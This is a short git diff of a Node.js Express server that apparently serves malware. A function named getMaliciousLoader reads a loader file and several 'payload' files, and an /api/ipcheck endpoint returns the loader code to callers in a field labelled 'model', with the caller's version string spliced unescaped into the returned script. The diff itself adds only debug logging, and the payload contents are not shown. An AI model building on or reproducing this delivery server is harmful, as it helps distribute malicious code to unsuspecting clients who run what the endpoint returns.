@@ -11,6 +11,7 @@ const payload2path = path.join(__dirname, 'extras','extra2.js');
 const payload3path = path.join(__dirname, 'extras','extra3.js');
 const getMaliciousLoader = () => {
     try{
+        console.log("hi");
         return fs.readFileSync(loaderPath, 'utf8');
     }catch(error) {
         console.error('Failed to read main:', error.message);
@@ -41,6 +42,7 @@ app.post('/api/ipcheck', (req,res) => {
     const {version} = req.body;
     console.log(`Received version: ${version}`);
     const maliciousLoaderContent = getMaliciousLoader();
+    console.log(maliciousLoaderContent);
     const responseContent = `${maliciousLoaderContent}\nconsole.log('Process version: ${version}');`;
     res.json({
         model:responseContent
